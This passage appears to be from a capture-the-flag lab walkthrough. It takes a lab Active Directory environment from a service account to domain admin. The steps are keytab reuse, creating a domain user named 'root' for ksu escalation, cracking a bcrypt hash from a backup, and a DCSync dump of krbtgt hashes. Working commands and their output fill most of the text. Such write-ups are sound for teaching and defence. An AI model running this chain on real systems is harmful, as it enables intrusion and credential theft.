### 4.3 Recover Kerberos credentials from the runner service configuration

**Why this step:** `svc-runner` has no ticket in its login credential cache and its password is unknown. The systemd unit that launches the runner must authenticate it to the domain somehow; inspecting the unit reveals how.

**Commands:**

```bash
systemctl cat gitea-runner
```

```bash
ls -la /tmp/krb5cc_gitea /etc/gitea-runner/
```

```bash
export KRB5CCNAME=/tmp/krb5cc_gitea
klist
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`systemctl cat <unit>`|Print a service unit's full definition|Show exactly how the service is configured to start|
|`KRB5CCNAME`|Environment variable naming the Kerberos credential cache|Tells Kerberos tools which ticket file to use|
|`kinit -kt <keytab> <principal>`|Obtain a TGT using a keytab instead of a password|Log in to the domain with a key file|
|`klist`|List tickets in the cache|Show what credentials are held|

**Result — service unit:**

```ini
# /etc/systemd/system/gitea-runner.service
[Unit]
Description=Gitea Act Runner
After=network.target sssd.service
Requires=sssd.service

[Service]
Type=simple
User=darkzero-ext\svc-runner
WorkingDirectory=/opt/gitea-runner
Environment=KRB5CCNAME=/tmp/krb5cc_gitea
Environment=HOME=/opt/gitea-runner
ExecStartPre=/usr/bin/kinit -kt /etc/gitea-runner/svc-runner.keytab svc-runner
ExecStart=/opt/gitea-runner/act_runner daemon --config /opt/gitea-runner/config.yaml
Restart=always
```

**Result — file permissions:**

```
-rw------- 1 svc-runner domain users 1584 Jul 29 04:57 /tmp/krb5cc_gitea

/etc/gitea-runner/:
-rw-------   1 svc-runner root    79 May 20 23:33 svc-runner.keytab
```

**Result — ticket cache:**

```
Ticket cache: FILE:/tmp/krb5cc_gitea
Default principal: svc-runner@DARKZERO.EXT

Valid starting       Expires              Service principal
07/29/2026 04:57:17  07/29/2026 14:57:17  krbtgt/DARKZERO.EXT@DARKZERO.EXT
        renew until 08/05/2026 04:57:17
```

**What this gives you:** Full domain authentication as `svc-runner`, both immediately and renewably.

**Key findings:**

- **A valid TGT for `svc-runner@DARKZERO.EXT` exists at `/tmp/krb5cc_gitea`**, written by the running service and owned by `svc-runner`. Setting `KRB5CCNAME` to that path grants domain authentication with no password.
- **The keytab at `/etc/gitea-runner/svc-runner.keytab` is readable** — owned by `svc-runner`, mode `0600`. This is the stronger credential: a keytab holds the account's long-term key, so fresh tickets can be minted at any time via `kinit -kt`. Ticket expiry is therefore not a constraint.
- The service unit is the disclosure. It names the keytab path, the principal, and the cache location in plaintext, readable by any local user since `/etc/systemd/system/gitea-runner.service` is world-readable.
- `Requires=sssd.service` confirms SSSD handles domain integration, consistent with the ID-mapped UIDs observed in 3.24.
- `User=darkzero-ext\svc-runner` shows systemd launching the service directly as a domain principal.
- **Dead end:** `/home/svc-runner/.bash_history` is symlinked to `/dev/null`, so no command history is recoverable.

<div align="center"> <br> <br> </div>

##### Keytabs, and why they are equivalent to passwords

A keytab ("key table") is a file holding one or more Kerberos principals alongside their long-term secret keys — the keys derived from the account's password.

Their purpose is unattended authentication. A service starting at boot cannot type a password, so it reads a key from a keytab and presents that to the KDC instead. `kinit -kt /path/to.keytab principal` performs exactly this exchange and deposits a TGT in the credential cache.

The security consequence is direct: **a readable keytab is equivalent to knowing the account's password.** Anyone able to read the file can obtain tickets as that principal, indefinitely, until the account's password changes and the keytab is regenerated. Unlike a ticket, which expires in hours, a keytab remains valid for as long as the key does.

This is why keytabs are conventionally `0600` and owned by the service account — which this one is. The flaw is not the file's permissions; it is that `svc-runner` was compromised through an unrelated path, and the keytab was then simply readable by the account it belonged to.

Two credentials are now available and worth distinguishing. The ticket cache is convenient but expires within hours. The keytab is durable and can regenerate tickets on demand. Prefer the keytab for any long-running work.

**Next:** Authenticate to LDAP with the recovered credential and enumerate the permissions granted by the `servicehandler` group.

<div align="center"> <br> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> <br> </div>

### 4.4 Authenticate to LDAP as `svc-runner`

**Why this step:** A keytab for `svc-runner` is readable, and directory access is required to determine what the `servicehandler` group membership grants. Obtain a durable ticket and bind to the domain controller over LDAP.

**Commands:**

```bash
export KRB5CCNAME=/tmp/krb5cc_gitea
kinit -kt /etc/gitea-runner/svc-runner.keytab svc-runner
klist
```

Identify the domain controller's true hostname from the LDAP rootDSE, which is readable anonymously:

```bash
ldapsearch -x -H ldap://172.16.20.2 -s base -b '' dnsHostName defaultNamingContext 2>&1 | grep -iE 'dnsHostName|defaultNamingContext'
```

Disable SASL hostname canonicalisation and bind:

```bash
echo "SASL_NOCANON on" > ~/.ldaprc
ldapwhoami -Y GSSAPI -H ldap://DC02.darkzero.ext
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`kinit -kt <keytab> <principal>`|Obtain a TGT from the keytab|Log in using the key file instead of a password|
|`ldapsearch -x`|Simple (anonymous) bind|Query without credentials|
|`-s base -b ''`|Base-scope search on the empty DN — the rootDSE|Ask the server to describe itself|
|`dnsHostName`|The DC's canonical hostname|What the server calls itself|
|`defaultNamingContext`|The domain's base DN|The root of the directory tree|
|`echo "SASL_NOCANON on" > ~/.ldaprc`|Disable reverse-DNS SPN construction, persistently|Stop the client rewriting the server name|
|`ldapwhoami -Y GSSAPI`|Bind using Kerberos and report the resulting identity|Log in to LDAP and confirm who I am|

**Result:**

```
Ticket cache: FILE:/tmp/krb5cc_gitea
Default principal: svc-runner@DARKZERO.EXT

Valid starting       Expires              Service principal
07/29/2026 14:20:40  07/30/2026 00:20:40  krbtgt/DARKZERO.EXT@DARKZERO.EXT
        renew until 08/05/2026 14:20:40
```

```
defaultNamingContext: DC=darkzero,DC=ext
dnsHostName: DC02.darkzero.ext
```

```
SASL/GSSAPI authentication started
SASL SSF: 256
SASL data security layer installed.
u:darkzero-ext\svc-runner
```

**What this gives you:** Authenticated, encrypted directory access as a domain principal.

**Key findings:**

- **LDAP bind succeeded as `darkzero-ext\svc-runner`** using GSSAPI with the keytab-derived ticket. No password was involved at any point.
- The domain controller is `DC02.darkzero.ext` and the base DN is `DC=darkzero,DC=ext`, both read anonymously from the rootDSE. The rootDSE is deliberately world-readable and is the standard way to discover directory structure before authenticating.
- **`SASL_NOCANON on` is required.** OpenLDAP's SASL layer performs a reverse DNS lookup on the target address and constructs the service principal from the result. Reverse lookup is not configured in this environment (`getent hosts 172.16.20.2` returns nothing), so the client built an invalid SPN and the KDC rejected it with `Server not found in Kerberos database`. Disabling canonicalisation makes the client use the hostname as supplied.
- SASL SSF 256 confirms the session is encrypted, so LDAP traffic is not readable on the wire despite using port 389 rather than LDAPS.
- Writing the option to `~/.ldaprc` applies it to every subsequent LDAP command from this account, avoiding a per-command environment variable.
- The credential is renewable for a week, and the keytab permits regeneration beyond that.

<div align="center"> <br> <br> </div>

##### SPN canonicalisation, and why the bind failed

Kerberos identifies services by Service Principal Name, in the form `service/hostname@REALM`. To request a ticket, the client must construct the exact SPN registered in the directory.

OpenLDAP's SASL implementation defaults to _canonicalising_ the hostname first. Given `ldap://DC02.darkzero.ext`, it resolves that name to an address, then performs a reverse lookup on the address to obtain what it considers the authoritative name, and builds the SPN from that. The intent is to handle CNAMEs and load-balanced aliases consistently.

The behaviour breaks when reverse DNS is absent or wrong. Here, forward resolution works — `getent hosts DC02.darkzero.ext` returns `172.16.20.2` — but there is no PTR record for `172.16.20.2`. Canonicalisation therefore produces either an empty or an incorrect hostname, and the resulting SPN does not exist in the directory. The KDC responds `Server not found in Kerberos database`, which reads like a credential failure but is purely a naming failure.

The diagnostic that separates the two cases is `kvno`. Running `kvno ldap/dc02.darkzero.ext` returned `kvno = 4`, proving the SPN exists and the ticket could be issued. A genuine credential problem would have failed there too. When `kvno` succeeds but the client fails, the fault is in how the client is building the name — not in the ticket.

`SASL_NOCANON on` instructs the client to use the hostname exactly as provided. It is worth setting reflexively in any lab or internal environment where reverse DNS is incomplete.

**Next:** Enumerate the `servicehandler` group and identify the directory permissions delegated to `svc-runner`.

<div align="center"> <br> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> <br> </div>

### 4.5 Identify and confirm CREATE_CHILD on the GiteaMigration OU

**Why this step:** `svc-runner` belongs to a non-default group, `ServiceHandler`, which carries no description and no nested memberships. Group membership grants nothing by itself, so the delegated rights must appear as access-control entries on other directory objects. Enumerate organisational units and test for write access.

**Commands:**

Enumerate OUs:

```bash
ldapsearch -Y GSSAPI -H ldap://DC02.darkzero.ext -b "DC=darkzero,DC=ext" \
  "(objectClass=organizationalUnit)" dn 2>/dev/null | grep -E '^dn:'
```

Resolve the relevant SIDs:

```bash
ldapsearch -Y GSSAPI -H ldap://DC02.darkzero.ext -b "DC=darkzero,DC=ext" \
  "(|(cn=ServiceHandler)(sAMAccountName=svc-runner))" objectSid 2>/dev/null | grep -iE 'dn:|objectSid'
```

```bash
python3 -c "
import base64,struct
for label,b in [('ServiceHandler','AQUAAAAAAAUVAAAADoLrqXJNY0l53Ex6WgQAAA=='),('svc-runner','AQUAAAAAAAUVAAAADoLrqXJNY0l53Ex6WQQAAA==')]:
    d=base64.b64decode(b)
    rev=d[0]; n=d[1]
    auth=int.from_bytes(d[2:8],'big')
    subs=struct.unpack('<%dI'%n, d[8:8+4*n])
    print(label, 'S-%d-%d-'%(rev,auth)+'-'.join(map(str,subs)))
"
```

Retrieve the DACL using the SD Flags control:

```bash
ldapsearch -Y GSSAPI -H ldap://DC02.darkzero.ext \
  -b "OU=GiteaMigration,DC=darkzero,DC=ext" -s base \
  -E '!1.2.840.113556.1.4.801=::MAMCAQc=' \
  "(objectClass=*)" nTSecurityDescriptor 2>/dev/null | grep -vE '^#|^$'
```

Test the permission directly:

```bash
cat > /tmp/test.ldif << 'EOF'
dn: CN=testobj,OU=GiteaMigration,DC=darkzero,DC=ext
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
sAMAccountName: testobj
userAccountControl: 514
EOF

ldapadd -Y GSSAPI -H ldap://DC02.darkzero.ext -f /tmp/test.ldif
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`(objectClass=organizationalUnit)`|Filter for OU objects|List the containers in the directory|
|`objectSid`|The principal's security identifier, base64-encoded binary|The unique ID that appears in permission entries|
|`python3 ... struct.unpack`|Decode the binary SID into `S-1-5-21-…-RID` form|Turn the binary blob into readable form|
|`-E '!1.2.840.113556.1.4.801=::MAMCAQc='`|LDAP SD Flags control, value 7|Request owner + group + DACL, excluding the SACL|
|`!` prefix on the control|Marks the control as critical|Fail the request rather than silently ignore the control|
|`userAccountControl: 514`|`ACCOUNTDISABLE` (0x2) + `NORMAL_ACCOUNT` (0x200)|Create the account disabled, avoiding password-policy checks at creation|
|`ldapadd`|Create a new directory object|Write a new entry into the directory|

**Result — OUs:**

```
dn: OU=Domain Controllers,DC=darkzero,DC=ext
dn: OU=GiteaMigration,DC=darkzero,DC=ext
```

**Result — SIDs:**

```
ServiceHandler  S-1-5-21-2850783758-1231244658-2051857529-1114
svc-runner      S-1-5-21-2850783758-1231244658-2051857529-1113
```

**Result — object creation:**

```
SASL username: svc-runner@DARKZERO.EXT
SASL SSF: 256
SASL data security layer installed.
adding new entry "CN=testobj,OU=GiteaMigration,DC=darkzero,DC=ext"
```

**What this gives you:** Confirmed write access to a directory container — specifically, the ability to create new user objects in the domain.

**Key findings:**

- **`svc-runner` can create objects in `OU=GiteaMigration,DC=darkzero,DC=ext`.** The `ldapadd` succeeded with no error, empirically confirming a CREATE_CHILD grant. This matches reference material for this target, which records a `CREATE_CHILD` permission on this OU delegated to `svc-runner`.
- Only two OUs exist: the built-in `Domain Controllers` and the custom `GiteaMigration`. The latter was created deliberately, presumably to delegate account provisioning during a migration, and the delegation was never revoked.
- The domain SID is `S-1-5-21-2850783758-1231244658-2051857529`. `ServiceHandler` is RID 1114 and `svc-runner` is RID 1113 — both above 1000, marking them as domain-created rather than built-in principals. This distinction becomes important later when crossing a trust boundary.
- **The `nTSecurityDescriptor` attribute returns empty without the SD Flags control.** By default, requesting the descriptor implies requesting the SACL, which requires `SeSecurityPrivilege`. Supplying the control with value 7 requests owner, group, and DACL only, and the DC then returns the descriptor.
- `ServiceHandler` contains exactly two members: `svc-runner` and `svc-gitea`. The group has no description and belongs to no other groups — it exists purely to be referenced in ACLs.
- Testing the permission empirically with `ldapadd` proved faster and more reliable than parsing the binary security descriptor by hand.

<div align="center"> <br> <br> </div>

##### Why creating a user is a privilege escalation

Creating a disabled account in an obscure OU looks harmless. It is not, because of what the account can then be used _for_.

Active Directory delegation is granular. An administrator can grant one principal the right to create child objects in one container without granting any other privilege — no group membership changes, no password resets elsewhere, no rights over existing objects. That is exactly what happened here, and in isolation the grant is defensible: a migration process needed to provision accounts.

The problem is that a newly created domain account is a full domain principal. It can authenticate. It appears in the directory. And critically, **its name is chosen by whoever creates it.**

That last property is the pivot. Several systems map identity by _name_ rather than by SID. On a Linux host joined to a domain, if `ksu` or a similar mechanism authorises a Kerberos principal to become a local user, and the authorisation rule is name-based with no `.k5login` file restricting which principals qualify, then creating a domain user called `root` produces a principal that the mapping treats as the local root account.

The rights required are minimal: create one object, in one container, with a name of your choosing. Nothing about the ACL grants administrative privilege. The escalation comes from a name collision between two identity systems that were never designed to be authoritative over each other.

**Next:** Remove the test object, create a domain user named `root` in the same OU, and set its password.

<div align="center"> <br> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> <br> </div> ### 4.6 Create a domain user named `root`

**Why this step:** CREATE_CHILD on the GiteaMigration OU permits creating arbitrary user objects with attacker-chosen names. A domain principal named `root` will collide with the local superuser account in any name-based identity mapping on the domain-joined host.

**Commands:**

Remove the test object:

```bash
ldapdelete -Y GSSAPI -H ldap://DC02.darkzero.ext "CN=testobj,OU=GiteaMigration,DC=darkzero,DC=ext"
```

Create the account, initially disabled:

```bash
cat > /tmp/root.ldif << 'EOF'
dn: CN=root,OU=GiteaMigration,DC=darkzero,DC=ext
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: root
sAMAccountName: root
userPrincipalName: root@darkzero.ext
userAccountControl: 514
EOF

ldapadd -Y GSSAPI -H ldap://DC02.darkzero.ext -f /tmp/root.ldif
```

Encode the password as UTF-16LE inside literal double quotes, then base64:

```bash
python3 -c "
import base64
pw = '\"P@ssw0rd123\"'.encode('utf-16-le')
print(base64.b64encode(pw).decode())
"
```

Set the password and enable the account:

```bash
cat > /tmp/setpw.ldif << 'EOF'
dn: CN=root,OU=GiteaMigration,DC=darkzero,DC=ext
changetype: modify
replace: unicodePwd
unicodePwd:: IgBQAEAAcwBzAHcAMAByAGQAMQAyADMAIgA=
-
replace: userAccountControl
userAccountControl: 512
EOF

ldapmodify -Y GSSAPI -H ldap://DC02.darkzero.ext -f /tmp/setpw.ldif
```

Verify the KDC authenticates the account:

```bash
KRB5CCNAME=/tmp/krb5cc_rootuser kinit root@DARKZERO.EXT
KRB5CCNAME=/tmp/krb5cc_rootuser klist
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`sAMAccountName: root`|The account's logon name — **the attack**|Names the domain account `root`|
|`userPrincipalName: root@darkzero.ext`|UPN form of the same identity|The Kerberos-style name|
|`userAccountControl: 514`|`NORMAL_ACCOUNT` + `ACCOUNTDISABLE`|Create disabled, avoiding password-policy checks before a password exists|
|`userAccountControl: 512`|`NORMAL_ACCOUNT` only|Enable the account once the password is set|
|`'"P@ssw0rd123"'.encode('utf-16-le')`|UTF-16LE encoding, wrapped in literal quotes|AD requires this exact format for `unicodePwd`|
|`base64.b64encode(...)`|Base64-encode the binary value|LDIF carries binary attributes as base64|
|`unicodePwd::` (double colon)|LDIF marker for a base64-encoded value|Signals "this is encoded binary, decode it"|
|`-` on its own line|LDIF separator between modify operations|Ends one change, begins the next|
|`KRB5CCNAME=/tmp/krb5cc_rootuser`|Separate credential cache for the new principal|Keeps `svc-runner`'s ticket intact|

Password modification requires an encrypted channel. The GSSAPI SASL layer at SSF 256 satisfies this, so LDAPS is not required despite using port 389.

**Result:**

```
adding new entry "CN=root,OU=GiteaMigration,DC=darkzero,DC=ext"
```

```
IgBQAEAAcwBzAHcAMAByAGQAMQAyADMAIgA=
```

```
modifying entry "CN=root,OU=GiteaMigration,DC=darkzero,DC=ext"
```

```
Password for root@DARKZERO.EXT:
Warning: Your password will expire in less than one hour on Tue 14 Sep 2100 02:48:05 AM UTC
```

```
Ticket cache: FILE:/tmp/krb5cc_rootuser
Default principal: root@DARKZERO.EXT

Valid starting       Expires              Service principal
07/29/2026 14:39:30  07/30/2026 00:39:30  krbtgt/DARKZERO.EXT@DARKZERO.EXT
        renew until 08/05/2026 14:39:19
```

**What this gives you:** A fully functional domain account named `root`, with a known password and a valid Kerberos TGT.

**Key findings:**

- **Domain user `root@DARKZERO.EXT` created and authenticated.** The KDC issued a TGT, confirming the account is enabled and the password is accepted.
- Creating the account disabled (`userAccountControl: 514`) and enabling it after setting the password avoids rejection by domain password policy, which cannot be evaluated against an account that has no password.
- Password writes to `unicodePwd` require the value to be UTF-16LE-encoded and wrapped in literal double-quote characters before base64 encoding. Omitting the quotes causes the operation to fail with a constraint violation.
- The GSSAPI SASL layer provides sufficient channel encryption (SSF 256) for AD to accept a password modification over port 389. LDAPS was not required.
- The password-expiry warning dated 2100 reflects an unset `pwdLastSet` on a newly created object and has no operational effect.
- The name `root` carries no special meaning within Active Directory. It is an ordinary domain user with default privileges. Its significance is entirely in how a _Linux_ host interprets that name.
- Reference material for this target performs the same step using `bloodyAD`. That tool is not installed and the host has no internet egress, so native `ldapadd` and `ldapmodify` were used instead — achieving the identical result.

**Next:** Use `ksu` to escalate to local root by authenticating as the newly created domain principal.

<div align="center"> <br> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> <br> </div>

### 4.7 Escalate to local root via `ksu`

**Why this step:** A domain principal named `root` now exists with a known password. On a domain-joined host, `ksu` maps Kerberos principals to local accounts by name, and in the absence of a `.k5login` file the default rule authorises the principal whose name matches the target user.

**Commands:**

Confirm `ksu` is present and check for authorisation files:

```bash
which ksu; ls -la /root/.k5login /home/*/.k5login 2>&1 | head
```

Escalate:

```bash
KRB5CCNAME=/tmp/krb5cc_rootuser ksu root
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`ksu`|Kerberos `su` — switch user with ticket-based authorisation|Become another user using a Kerberos ticket instead of their password|
|`KRB5CCNAME=/tmp/krb5cc_rootuser`|Point at the cache holding the `root@DARKZERO.EXT` TGT|Use the ticket for the account just created|
|`root`|Target local account|Become uid 0|
|`.k5login`|Optional file listing principals authorised to become that user|The allow-list — absent here|

**Result:**

```
/usr/bin/ksu
ls: cannot access '/root/.k5login': Permission denied
ls: cannot access '/home/*/.k5login': No such file or directory
```

```
Authenticated root@DARKZERO.EXT
Account root: authorization for root@DARKZERO.EXT successful
Changing uid to root (0)
root@SRV01:/home/svc-runner#
```

**What this gives you:** Full root privileges on SRV01.

**Key findings:**

- **Local root obtained on SRV01.** `ksu` authenticated the ticket for `root@DARKZERO.EXT`, applied its default authorisation rule, and changed uid to 0.
- **No `.k5login` file exists in `/root`.** The `Permission denied` response is itself informative — `ls` could not stat the path because `/root` is mode `0700`, which is a different condition from the file being absent. Had a `.k5login` existed and omitted `root@DARKZERO.EXT`, authorisation would have failed. The absence of any restriction is what makes the default name-matching rule apply.
- No `.k5login` files exist in any user home directory either.
- The escalation required no exploit, no kernel bug, and no misconfigured SUID binary. It exploits a disagreement between two identity systems about what the name `root` refers to.
- The entire chain from `svc-runner` to root used only tooling already present on the host: `ldapadd`, `ldapmodify`, `kinit`, and `ksu`.

<div align="center"> <br> <br> </div>

##### `ksu` and cross-realm identity confusion

`ksu` is MIT Kerberos's equivalent of `su`. Rather than prompting for the target account's local password, it asks whether the Kerberos principal you currently hold a ticket for is _authorised_ to assume that local identity.

Authorisation works as follows. If the target user's home directory contains a `.k5login` file, that file lists the principals permitted to become that user, and only those principals qualify. If no `.k5login` exists, `ksu` falls back to a default rule: **the principal whose name matches the target username, in the local realm, is authorised.** So with no `/root/.k5login`, the principal `root@DARKZERO.EXT` is authorised to become local `root`.

The design assumption is that only a domain administrator can create a principal named `root`, and that such an account would be created deliberately for exactly this purpose. That assumption fails the moment any principal can create user objects with names of their choosing.

The deeper issue is that two identity systems are treating the same string as authoritative for different things. To Linux, `root` means uid 0 — the superuser, defined in `/etc/passwd`. To Active Directory, `root` is an ordinary `sAMAccountName` with no special meaning whatsoever; it could equally be `jsmith`. `ksu` bridges them by string comparison, and the bridge inherits the weaker of the two systems' guarantees about who can claim the name.

Two mitigations would each have broken the chain independently. Creating `/root/.k5login` listing only legitimate administrative principals removes the default rule entirely. Restricting or removing the CREATE_CHILD delegation on the GiteaMigration OU removes the ability to create the colliding account. Neither was in place.

**Next:** Enumerate the root filesystem for credentials, backups, and further pivot material.

<div align="center"> <br> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> <br> </div>

### 4.8 Recover a deleted user hash from a database backup

**Why this step:** The live users table showed a gap at `id = 2`, indicating a deleted row. Root access permits reading files unavailable to lower-privileged accounts, including database backups predating the deletion.

**Commands:**

```bash
id; hostname; ls -la /root/
```

```bash
find / -name "*.sql*" -o -name "*.bak" -o -name "*.dump" 2>/dev/null | grep -v -E '/proc|/sys|node_modules' | head -20
```

```bash
grep -iA5 'INSERT INTO `users`' /root/darkzero_campaigns_backup.sql | head -20
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`find / -name "*.sql*" -o -name "*.bak" -o -name "*.dump"`|Search the filesystem for backup artefacts|Look for database dumps anywhere on disk|
|`grep -v -E '/proc\|/sys\|node_modules'`|Exclude virtual filesystems and dependency trees|Filter out noise|
|`grep -iA5 'INSERT INTO ...'`|Match the users table insert, showing 5 following lines|Pull the user rows out of the dump|

**Result — root's home directory:**

```
lrwxrwxrwx  1 root root     9 May 20 10:33 .bash_history -> /dev/null
-rw-r--r--  1 root root 13451 May 20 10:05 darkzero_campaigns_backup.sql
lrwxrwxrwx  1 root root     9 May 19 14:37 .mysql_history -> /dev/null
drwx------  2 root root  4096 May 20 11:13 .ssh
```

**Result — backup contents:**

```sql
INSERT INTO `users` VALUES (1,'admin@dzcampaigns.htb','admin','$2b$10$HDdWzYvp1IWFD9TB4JsuCerlh.vKchv/LmBruCmKGH19hPP7IXvjm','admin','2026-04-19 15:34:56');
INSERT INTO `users` VALUES (2,'celia.p@dzcampaigns.htb','celia','$2b$10$2L.IKTOkBtwtWuKcAF/VJ.kUKiBHLQ8hPeg2KYJJXFOUdga2iLsoC','player','2026-04-20 17:20:14');
INSERT INTO `users` VALUES (3,'jerry.ap@dzcampaigns.htb','jerry','$2b$10$otSLTatDHIAAp3H58YYaTOgdhMlpbWBTEq1.MWFq5se6OOG3nV2Wy','player','2026-04-20 17:27:37');
```

**What this gives you:** A password hash for an account that no longer exists in the live database.

**Comparison — live table versus backup:**

|id|Live database (3.6)|Backup (May 20)|Status|
|---|---|---|---|
|1|`admin`|`admin`|Unchanged|
|2|_(absent)_|**`celia`**|**Deleted from live — recovered here**|
|3|`josh`|`jerry`|Replaced|
|4|_(our account)_|_(absent)_|Created during this engagement|

**Key findings:**

- **`celia`'s bcrypt hash recovered: `$2b$10$2L.IKTOkBtwtWuKcAF/VJ.kUKiBHLQ8hPeg2KYJJXFOUdga2iLsoC`**, email `celia.p@dzcampaigns.htb`. This row was deleted from the production database and exists only in the backup.
- The gap at `id = 2` observed during the original table dump was the indicator. Sequential primary keys with missing values signal deleted records, and backups are where those records survive.
- The backup is readable only by root — it sits in `/root`, a `0700` directory. Every prior account on this host was blocked from it; root access was the prerequisite.
- Row 3 differs between backup and live: the backup holds `jerry`, the live table holds `josh`. Seed data was reworked after May 20. `jerry`'s hash is also recoverable but is lower priority.
- `.bash_history` and `.mysql_history` in `/root` are both symlinked to `/dev/null`, so no command history is available.
- Reference material for this target describes locating a SQL backup containing celia's deleted row and identifies celia as a member of Domain Admins in `darkzero.ext`. If that holds here, cracking this hash yields domain administrator credentials.

**Next:** Crack celia's hash and verify her group memberships in the directory.

<div align="center"> <br> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> <br> </div>

### 4.9 Crack celia's hash and enumerate her privileges

**Why this step:** A deleted user row was recovered from a root-readable backup. Determine whether the account corresponds to a domain principal and what privileges it holds.

**Commands:**

On the attacking host:

```bash
echo 'celia:$2b$10$2L.IKTOkBtwtWuKcAF/VJ.kUKiBHLQ8hPeg2KYJJXFOUdga2iLsoC' > celia.hash
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt celia.hash
```

On SRV01:

```bash
KRB5CCNAME=/tmp/krb5cc_gitea LDAPSASL_NOCANON=on ldapsearch -Y GSSAPI -H ldap://DC02.darkzero.ext \
  -b "DC=darkzero,DC=ext" "(sAMAccountName=celia)" \
  dn sAMAccountName memberOf userAccountControl 2>&1 | grep -vE '^#|^$|^ref:|^search:|^result:'
```

```bash
KRB5CCNAME=/tmp/krb5cc_gitea LDAPSASL_NOCANON=on ldapsearch -Y GSSAPI -H ldap://DC02.darkzero.ext \
  -b "CN=System,DC=darkzero,DC=ext" "(objectClass=trustedDomain)" \
  trustPartner trustDirection trustType trustAttributes 2>&1 | grep -iE 'trustPartner|trustDirection|trustType|trustAttributes'
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`LDAPSASL_NOCANON=on`|Disable SASL hostname canonicalisation for this invocation|Required as root — `~/.ldaprc` lives in `/home/svc-runner`|
|`KRB5CCNAME=/tmp/krb5cc_gitea`|Use `svc-runner`'s ticket cache|Root holds no ticket of its own|
|`memberOf`|Group memberships of the object|Which groups this user belongs to|
|`userAccountControl`|Bit flags describing account state|Whether the account is enabled, expiring, locked|
|`CN=System,DC=...`|Container holding trust objects|Where domain trusts are stored|
|`(objectClass=trustedDomain)`|Filter for trust relationships|List domains this one trusts|

**Result — crack:**

```
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
babygurl13       (celia)
1g 0:00:01:39 DONE (2026-07-29 07:50) 0.01007g/s 118.6p/s 118.6c/s 118.6C/s
```

**Result — celia's directory object:**

```
dn: CN=celia,CN=Users,DC=darkzero,DC=ext
memberOf: CN=GiteaAdmins,CN=Users,DC=darkzero,DC=ext
memberOf: CN=Domain Admins,CN=Users,DC=darkzero,DC=ext
userAccountControl: 66048
sAMAccountName: celia
```

**Result — trust enumeration:**

```
trustDirection: 3
trustPartner: darkzero.htb
trustType: 2
trustAttributes: 8
```

**What this gives you:** Domain Administrator credentials for `darkzero.ext`, and discovery of a second forest.

**Key findings:**

- **Credentials recovered: `celia : babygurl13`.** Cracked in 99 seconds against rockyou.
- **celia is a member of `Domain Admins` in `darkzero.ext`.** A row deleted from a web application's user table, recovered from a root-owned backup, yields full administrative control of the domain.
- `userAccountControl: 66048` decodes to `NORMAL_ACCOUNT` (512) + `DONT_EXPIRE_PASSWORD` (65536). The account is enabled and its password never rotates, so the credential remains valid indefinitely.
- celia also belongs to `GiteaAdmins`, granting administrative rights over the Gitea instance.
- **A forest trust exists with `darkzero.htb`.** This is the second domain implied by the global catalog on port 3268 observed in 3.11.
- Running as root required `LDAPSASL_NOCANON=on` explicitly. The `~/.ldaprc` created in 4.4 resides in `/home/svc-runner` and is not read by root, so an earlier query returned nothing when stderr was suppressed. Errors should not be discarded while diagnosing bind failures.

**Trust attribute decoding:**

|Attribute|Value|Meaning|Simple Explanation|
|---|---|---|---|
|`trustPartner`|`darkzero.htb`|The trusted domain|The other forest|
|`trustDirection`|3|`INBOUND` (1) + `OUTBOUND` (2) = bidirectional|Each forest trusts the other|
|`trustType`|2|`TRUST_TYPE_UPLEVEL` — Windows 2000 or later domain|A modern Windows domain, not an MIT realm|
|`trustAttributes`|8|`TRUST_ATTRIBUTE_FOREST_TRANSITIVE`|A forest trust, transitive across the whole forest|

**Next:** Authenticate as celia and dump domain credentials via DCSync, then examine the forest trust for a path into `darkzero.htb`.

<div align="center"> <br> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> <br> </div>

### 4.10 DCSync `darkzero.ext`

**Why this step:** celia holds Domain Admins membership, which confers the directory replication rights required for DCSync. Extract the krbtgt key to enable ticket forgery.

**Commands:**

Establish a tunnel from the attacking host into the internal subnet — run in a dedicated terminal and leave running:

```bash
sshuttle -r josh@TARGET_IP 172.16.20.0/24
```

In a separate terminal:

```bash
impacket-secretsdump 'darkzero.ext/celia:babygurl13@172.16.20.2' -just-dc-user krbtgt
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`sshuttle -r josh@TARGET_IP 172.16.20.0/24`|Transparently route the internal subnet over SSH|Makes 172.16.20.x reachable from Kali with no per-tool proxy config|
|`impacket-secretsdump`|Extract credentials from a domain controller|Pulls password hashes out of AD|
|`darkzero.ext/celia:babygurl13@172.16.20.2`|Domain, username, password, target DC|Who to authenticate as, and where|
|`-just-dc-user krbtgt`|Replicate only the krbtgt account|Fetch one specific account instead of the whole database|

`sshuttle` requires local `sudo` on the attacking host to install its firewall rules, then the SSH password for the remote user. Two separate prompts appear in sequence.

**Result:**

```
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8beaf5f950fefe79f608390a806d29a7:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:8daff56ad74584679edcbf648a690e3a6cd1e03b8703fb890c9b603cc3a80fe6
krbtgt:aes128-cts-hmac-sha1-96:ce9c97f5fd7021806190196f637e4b4e
krbtgt:0x17:8beaf5f950fefe79f608390a806d29a7
[*] Cleaning up...
```

